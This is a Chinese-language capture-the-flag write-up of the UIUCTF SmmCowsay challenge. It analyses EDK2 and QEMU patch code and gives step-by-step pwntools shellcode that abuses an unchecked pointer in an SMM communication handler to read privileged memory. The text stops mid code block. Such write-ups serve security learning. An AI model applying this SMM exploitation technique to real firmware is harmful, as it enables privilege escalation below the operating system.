<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">uiuctfmmio_realize</span><span class="params">(DeviceState *d, Error **errp)</span></span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+    SysBusDevice *dev = <span class="built_in">SYS_BUS_DEVICE</span>(d);</span><br><span class="line">+    UiuctfmmioState *sio = <span class="built_in">UIUCTFMMIO</span>(d);</span><br><span class="line">+    Object *obj = <span class="built_in">OBJECT</span>(sio);</span><br><span class="line">+    MemoryRegion *sysbus = <span class="built_in">sysbus_address_space</span>(dev);</span><br><span class="line">+</span><br><span class="line">+    <span class="built_in">memory_region_init_io</span>(&amp;sio-&gt;region4, obj, &amp;uiuctfmmio_region4_io_ops, sio,</span><br><span class="line">+                          TYPE_UIUCTFMMIO, <span class="number">0x1000</span>);</span><br><span class="line">+    <span class="built_in">sysbus_init_mmio</span>(dev, &amp;sio-&gt;region4);</span><br><span class="line">+    <span class="built_in">memory_region_add_subregion</span>(sysbus, <span class="number">0x44440000</span>, &amp;sio-&gt;region4);</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里用 <code>memory_region_init_io()</code> 函数初始化一个内存区域 <code>sio-&gt;region4</code>。这个内存区域的大小为 0x1000 字节。<code>&amp;uiuctfmmio_region4_io_ops</code> 指定了这个内存区域的 I&#x2F;O 操作回调函数,<code>sio</code> 作为 <code>opaque</code> 参数传递给回调函数。随后用sysbus_init_mmio将这个内存区域注册到 <code>SysBusDevice</code> 中,使其成为设备的一个 MMIO (Memory-Mapped I&#x2F;O) 区域。最后使用 <code>memory_region_add_subregion()</code> 函数将这个内存区域添加到系统总线的地址空间中,映射到物理地址0x44440000。也就是我们想要读取的flag的位置。</p>
<p>uiuctfmmio_region4_io_ops的write回调和read_with_attrs回调分别被设置成uiuctfmmio_write和uiuctfmmio_region4_read_with_attrs，后者是上面分析的函数。由此我们可以知道，qemu的patch在0x44440000初始化了一片大小为0x1000的MMIO的区域，可以用uiuctfmmio_region4_io_ops的函数进行IO。</p>
<h3 id="EFI-System-Table"><a href="#EFI-System-Table" class="headerlink" title="EFI System Table"></a>EFI System Table</h3><p>回收一下开头，开头的System Table地址是题目直接给我们的。EFI System Table里面有几乎所有我们需要的UEFI驱动的信息。可以通过这个Table寻址到很多api方法和配置变量。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">	CHAR16 *                   FirmwareVendor;       <span class="comment">/*    24     8 */</span></span><br><span class="line">	UINT32                     FirmwareRevision;     <span class="comment">/*    32     4 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* XXX 4 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">	EFI_HANDLE                 ConsoleInHandle;      <span class="comment">/*    40     8 */</span></span><br><span class="line">	EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;          <span class="comment">/*    48     8 */</span></span><br><span class="line">	EFI_HANDLE                 ConsoleOutHandle;     <span class="comment">/*    56     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut;        <span class="comment">/*    64     8 */</span></span><br><span class="line">	EFI_HANDLE                 StandardErrorHandle;  <span class="comment">/*    72     8 */</span></span><br><span class="line">	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr;        <span class="comment">/*    80     8 */</span></span><br><span class="line">	EFI_RUNTIME_SERVICES *     RuntimeServices;      <span class="comment">/*    88     8 */</span></span><br><span class="line">	EFI_BOOT_SERVICES *        BootServices;         <span class="comment">/*    96     8 */</span></span><br><span class="line">	UINTN                      NumberOfTableEntries; <span class="comment">/*   104     8 */</span></span><br><span class="line">	EFI_CONFIGURATION_TABLE *  ConfigurationTable;   <span class="comment">/*   112     8 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* size: 120, cachelines: 2, members: 13 */</span></span><br><span class="line">	<span class="comment">/* sum members: 116, holes: 1, sum holes: 4 */</span></span><br><span class="line">	<span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure>

<p>这里我们主要关注BootServices，里面有一些我们后面用得到的函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">	EFI_RAISE_TPL              RaiseTPL;             <span class="comment">/*    24     8 */</span></span><br><span class="line">	EFI_RESTORE_TPL            RestoreTPL;           <span class="comment">/*    32     8 */</span></span><br><span class="line">	EFI_ALLOCATE_PAGES         AllocatePages;        <span class="comment">/*    40     8 */</span></span><br><span class="line">	EFI_FREE_PAGES             FreePages;            <span class="comment">/*    48     8 */</span></span><br><span class="line">	EFI_GET_MEMORY_MAP         GetMemoryMap;         <span class="comment">/*    56     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">	EFI_ALLOCATE_POOL          AllocatePool;         <span class="comment">/*    64     8 */</span></span><br><span class="line">	EFI_FREE_POOL              FreePool;             <span class="comment">/*    72     8 */</span></span><br><span class="line">	EFI_CREATE_EVENT           CreateEvent;          <span class="comment">/*    80     8 */</span></span><br><span class="line">	EFI_SET_TIMER              SetTimer;             <span class="comment">/*    88     8 */</span></span><br><span class="line">	EFI_WAIT_FOR_EVENT         WaitForEvent;         <span class="comment">/*    96     8 */</span></span><br><span class="line">	EFI_SIGNAL_EVENT           SignalEvent;          <span class="comment">/*   104     8 */</span></span><br><span class="line">	EFI_CLOSE_EVENT            CloseEvent;           <span class="comment">/*   112     8 */</span></span><br><span class="line">	EFI_CHECK_EVENT            CheckEvent;           <span class="comment">/*   120     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">	EFI_INSTALL_PROTOCOL_INTERFACE InstallProtocolInterface; <span class="comment">/*   128     8 */</span></span><br><span class="line">	EFI_REINSTALL_PROTOCOL_INTERFACE ReinstallProtocolInterface; <span class="comment">/*   136     8 */</span></span><br><span class="line">	EFI_UNINSTALL_PROTOCOL_INTERFACE UninstallProtocolInterface; <span class="comment">/*   144     8 */</span></span><br><span class="line">	EFI_HANDLE_PROTOCOL        HandleProtocol;       <span class="comment">/*   152     8 */</span></span><br><span class="line">	<span class="type">void</span> *                     Reserved;             <span class="comment">/*   160     8 */</span></span><br><span class="line">	EFI_REGISTER_PROTOCOL_NOTIFY RegisterProtocolNotify; <span class="comment">/*   168     8 */</span></span><br><span class="line">	EFI_LOCATE_HANDLE          LocateHandle;         <span class="comment">/*   176     8 */</span></span><br><span class="line">	EFI_LOCATE_DEVICE_PATH     LocateDevicePath;     <span class="comment">/*   184     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">	EFI_INSTALL_CONFIGURATION_TABLE InstallConfigurationTable; <span class="comment">/*   192     8 */</span></span><br><span class="line">	EFI_IMAGE_LOAD             LoadImage;            <span class="comment">/*   200     8 */</span></span><br><span class="line">	EFI_IMAGE_START            StartImage;           <span class="comment">/*   208     8 */</span></span><br><span class="line">	EFI_EXIT                   Exit;                 <span class="comment">/*   216     8 */</span></span><br><span class="line">	EFI_IMAGE_UNLOAD           UnloadImage;          <span class="comment">/*   224     8 */</span></span><br><span class="line">	EFI_EXIT_BOOT_SERVICES     ExitBootServices;     <span class="comment">/*   232     8 */</span></span><br><span class="line">	EFI_GET_NEXT_MONOTONIC_COUNT GetNextMonotonicCount; <span class="comment">/*   240     8 */</span></span><br><span class="line">	EFI_STALL                  Stall;                <span class="comment">/*   248     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">	EFI_SET_WATCHDOG_TIMER     SetWatchdogTimer;     <span class="comment">/*   256     8 */</span></span><br><span class="line">	EFI_CONNECT_CONTROLLER     ConnectController;    <span class="comment">/*   264     8 */</span></span><br><span class="line">	EFI_DISCONNECT_CONTROLLER  DisconnectController; <span class="comment">/*   272     8 */</span></span><br><span class="line">	EFI_OPEN_PROTOCOL          OpenProtocol;         <span class="comment">/*   280     8 */</span></span><br><span class="line">	EFI_CLOSE_PROTOCOL         CloseProtocol;        <span class="comment">/*   288     8 */</span></span><br><span class="line">	EFI_OPEN_PROTOCOL_INFORMATION OpenProtocolInformation; <span class="comment">/*   296     8 */</span></span><br><span class="line">	EFI_PROTOCOLS_PER_HANDLE   ProtocolsPerHandle;   <span class="comment">/*   304     8 */</span></span><br><span class="line">	EFI_LOCATE_HANDLE_BUFFER   LocateHandleBuffer;   <span class="comment">/*   312     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 5 boundary (320 bytes) --- */</span></span><br><span class="line">	EFI_LOCATE_PROTOCOL        LocateProtocol;       <span class="comment">/*   320     8 */</span></span><br><span class="line">	EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES InstallMultipleProtocolInterfaces; <span class="comment">/*   328     8 */</span></span><br><span class="line">	EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces; <span class="comment">/*   336     8 */</span></span><br><span class="line">	EFI_CALCULATE_CRC32        CalculateCrc32;       <span class="comment">/*   344     8 */</span></span><br><span class="line">	EFI_COPY_MEM               CopyMem;              <span class="comment">/*   352     8 */</span></span><br><span class="line">	EFI_SET_MEM                SetMem;               <span class="comment">/*   360     8 */</span></span><br><span class="line">	EFI_CREATE_EVENT_EX        CreateEventEx;        <span class="comment">/*   368     8 */</span></span><br><span class="line">	<span class="comment">/* size: 376, cachelines: 6, members: 45 */</span></span><br><span class="line">	<span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure>

<h3 id="shellcode运行"><a href="#shellcode运行" class="headerlink" title="shellcode运行"></a>shellcode运行</h3><p>首先用pwntools的命令行插件生成shellcode</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240830113834713.png" alt="image-20240830113834713"></p>
<p>尝试运行</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240830114336253.png" alt="image-20240830114336253"></p>
<p>可以看到确实正常执行了输入的shellcode。接下来试试别的</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240830114538208.png" alt="image-20240830114538208"></p>
<p>我们直接读取0x44440000的数据，也就是题目的flag所存放的物理地址。读入rax和rbx中，我们转换一下hex发现</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240830114656957.png" alt="image-20240830114656957"></p>
<p>就是源代码的那个假flag。符合预期，因为我们现在并不是在SMM的特权级别去读取，那个secure参数并不会为True，不会进入真正的物理地址读取。</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">Cowsay</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST CHAR16 *Message</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line"></span><br><span class="line">  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer)  <span class="built_in">sizeof</span>(CHAR16 *));</span><br><span class="line">  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">  Buffer-&gt;MessageLength = <span class="built_in">sizeof</span>(CHAR16 *);</span><br><span class="line">  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line"></span><br><span class="line">  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">    mSmmCommunication,</span><br><span class="line">    Buffer,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FreePool</span>(Buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面分析过，此处的communicate是UEFI应用程序(binexec)和驱动之间通信的桥梁。传入的Buffer的结构是EFI_SMM_COMMUNICATE_HEADER，具体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Allows for disambiguation of the message format.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EFI_GUID  HeaderGuid;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Describes the size of Data (in bytes) and does not include the size of the header.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINTN     MessageLength;</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Designates an array of bytes that is MessageLength in size.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  UINT8     Data[<span class="number">1</span>];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure>

<p>注意到这一句</p>
<p> *(CONST CHAR16 **)&amp;Buffer-&gt;Data &#x3D; Message;</p>
<p>我们传给data成员的是一个指针。我们康康这个Message会传到哪儿。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+EFI_STATUS</span><br><span class="line">+EFIAPI</span><br><span class="line">+<span class="built_in">SmmCowsayHandler</span> (</span><br><span class="line">+  IN EFI_HANDLE  DispatchHandle,</span><br><span class="line">+  IN CONST VOID  *Context         OPTIONAL,</span><br><span class="line">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span><br><span class="line">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  <span class="built_in">DEBUG</span> ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; <span class="built_in">sizeof</span>(CHAR16 *))</span><br><span class="line">+    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">Cowsay</span>(*(CONST CHAR16 **)CommBuffer);</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">DEBUG</span> ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>之前已经注册了的smi的处理函数，CommBuffer即对应着我们传入的Message的data。我们可以看到没有做任何的处理就直接丢进Cowsay中了，而Cowsay是一个打印函数，传入的就是一个指针。因为这个处理方式完全没有检查传入的指针指向的地址，所以我们可以通过传入flag的0x44440000的地址，来让cowsay函数读出对应的地址的内容。因为是smi的handler函数，处于SMM下，所以用这个函数读取是能正常读出来而不是读到假flag的。</p>
<p>综上，我们下一步要做的，是调用下列函数并传入我们构造的vulnerable buffer</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">  mSmmCommunication,</span><br><span class="line">  Buffer,</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>首先找到mSmmCommunication</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;<span class="built_in">LocateProtocol</span>(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>以下是gpt的解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gBS-&gt;LocateProtocol() 是 UEFI 固件提供的一个重要的系统服务,它用于查找和获取一个特定的协议接口。协议接口是 UEFI 编程模型中的一个核心概念,它定义了一组标准化的函数和数据结构,用于访问系统服务或设备。</span><br><span class="line">gBS-&gt;LocateProtocol() 被用来查找并获取 EFI_SMM_COMMUNICATION_PROTOCOL 接口。这个协议提供了与 SMM (System Management Mode) 模式进行通信的功能。</span><br><span class="line">调用这个函数后,如果成功,mSmmCommunication 变量将指向所查找到的 EFI_SMM_COMMUNICATION_PROTOCOL 接口。然后,你的代码可以使用这个接口提供的函数来与 SMM 模式进行通信和交互。</span><br></pre></td></tr></table></figure>

<p>调用成功后第三个参数会变成一个协议的接口，随后我们就可以通过这个接口去调用Communicate。所以我们目标又变成了调用LocateProtocol。而LocateProtocol是UEFI的系统服务，是BootServices结构体的一个成员函数。所以调用链也很清晰了EFI_SYSTEM_TABLE-&gt;BootServices-&gt;LocateProtocol。理论可行，开始上手。</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><h4 id="get-LocateProtocal"><a href="#get-LocateProtocal" class="headerlink" title="get LocateProtocal"></a>get LocateProtocal</h4><p>首先写shellcode获取LocateProtocal</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;handout/run&#x27;</span>)</span><br><span class="line">conn = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">os.chdir(<span class="string">&#x27;../..&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;Address of SystemTable: &#x27;</span>)</span><br><span class="line">system_table = <span class="built_in">int</span>(conn.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;SystemTable @ 0x%x&#x27;</span>, system_table)</span><br><span class="line"></span><br><span class="line">conn.recvline()</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;system_table&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;LocateProtocol @ 0x%x&#x27;</span>, LocateProtocol)</span><br></pre></td></tr></table></figure>

<p>偏移从结构体里面找。由此获得地址</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831211433408.png" alt="image-20240831211433408"></p>
<p>本地运行几次都是这个地址，因为EDK2没有开ASLR。</p>
<h4 id="get-mSmmCommunication"><a href="#get-mSmmCommunication" class="headerlink" title="get mSmmCommunication"></a>get mSmmCommunication</h4><p>主动调用LocateProtocol，其中LocateProtocol第一个参数gEfiSmmCommunicationProtocolGuid我们需要在Binexec.efi里面找。因为Binexec的源代码里进行了调用，此时分配了一个对应的Guid。我尝试用源代码的Guid发现没法成功返回，只能用efi里硬编码的Guid。找LocateProtocol的方法就是看参数，第二个参数是0，第一个参数是一串16进制(因为是uid)。第三个参数是一个双重指针。很容易就找到了。</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831215931387.png" alt="image-20240831215931387"></p>
<p>很容易能看出来此处qword_103128对应的是bootService，因为这里是+320，一看就是LocateProtocol的偏移。可以通过这种方式把其他很多函数符号恢复了，一个可能是常见的小技巧吧。</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831221112297.png" alt="image-20240831221112297"></p>
<p>将第一个参数的16进制拿出来即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span><br><span class="line"></span><br><span class="line">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span><br><span class="line">    lea rcx, qword ptr [rip + guid]</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    lea r8, qword ptr [rip + protocol]</span><br><span class="line">    mov rax, &#123;LocateProtocol&#125;</span><br><span class="line">    call rax</span><br><span class="line"></span><br><span class="line">    test rax, rax</span><br><span class="line">    jnz fail</span><br><span class="line"></span><br><span class="line">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span><br><span class="line">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    ud2</span><br><span class="line"></span><br><span class="line">guid:</span><br><span class="line">    .octa &#123;gEfiSmmCommunicationProtocolGuid&#125;</span><br><span class="line">protocol:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由此获取mSmmCommunication，顺藤摸瓜获取Communicate函数。</p>
<h4 id="print-flag"><a href="#print-flag" class="headerlink" title="print flag?"></a>print flag?</h4><p>有Communicate了我们只需要构造一个buffer按道理来说就可以输出0x44440000地址的flag了。buffer中的headerGuid我们可以在patch文件或者SMMcowsay.efi里面找。如果在efi里面找，我们可以通过这种方式</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+  Status = gSmst-&gt;<span class="built_in">SmiHandlerRegister</span> (</span><br><span class="line">+                    SmmCowsayHandler,</span><br><span class="line">+                    &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">+                    &amp;DispatchHandle</span><br><span class="line">+                    );</span><br></pre></td></tr></table></figure>

<p>因为此处注册SMI处理函数的时候第一个参数对应的是一个函数指针，也就是handler函数。第二个对应的就是guid。我们找到第一个参数是函数指针且第二个参数是16进制的就可以定位了。</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831220954724.png" alt="image-20240831220954724"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gEfiSmmCowsayCommunicationGuid = 0xf79265547535a8b54d102c839a75cf12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span><br><span class="line">    mov rcx, &#123;mSmmCommunication&#125;</span><br><span class="line">    lea rdx, qword ptr [rip + buffer]</span><br><span class="line">    xor r8, r8</span><br><span class="line">    mov rax, &#123;Communicate&#125;</span><br><span class="line">    call rax</span><br><span class="line"></span><br><span class="line">    test rax, rax</span><br><span class="line">    jnz fail</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    ud2</span><br><span class="line"></span><br><span class="line">buffer:</span><br><span class="line">    .octa &#123;gEfiSmmCowsayCommunicationGuid&#125; /* Buffer-&gt;HeaderGuid */</span><br><span 